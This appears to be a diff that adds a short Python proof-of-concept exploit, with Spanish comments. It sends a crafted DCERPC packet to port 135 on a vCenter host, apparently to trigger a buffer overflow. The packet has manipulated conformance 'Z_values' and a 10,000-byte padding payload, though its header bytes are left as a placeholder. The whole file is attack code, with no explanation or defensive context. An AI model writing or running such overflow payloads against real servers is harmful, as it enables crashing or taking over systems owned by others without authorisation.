@@ -1,0 +1,9 @@
+import socket
+
+packet = b"\x00\x01..."  # encabezados DCERPC + conformance header
+packet += b"\x63\x66\x03\x02"  # Z_values manipuladas
+packet += b"A" * 10000        # payload para overflow
+
+s = socket.create_connection(("vcenter.example.com", 135))
+s.send(packet)
+s.close()
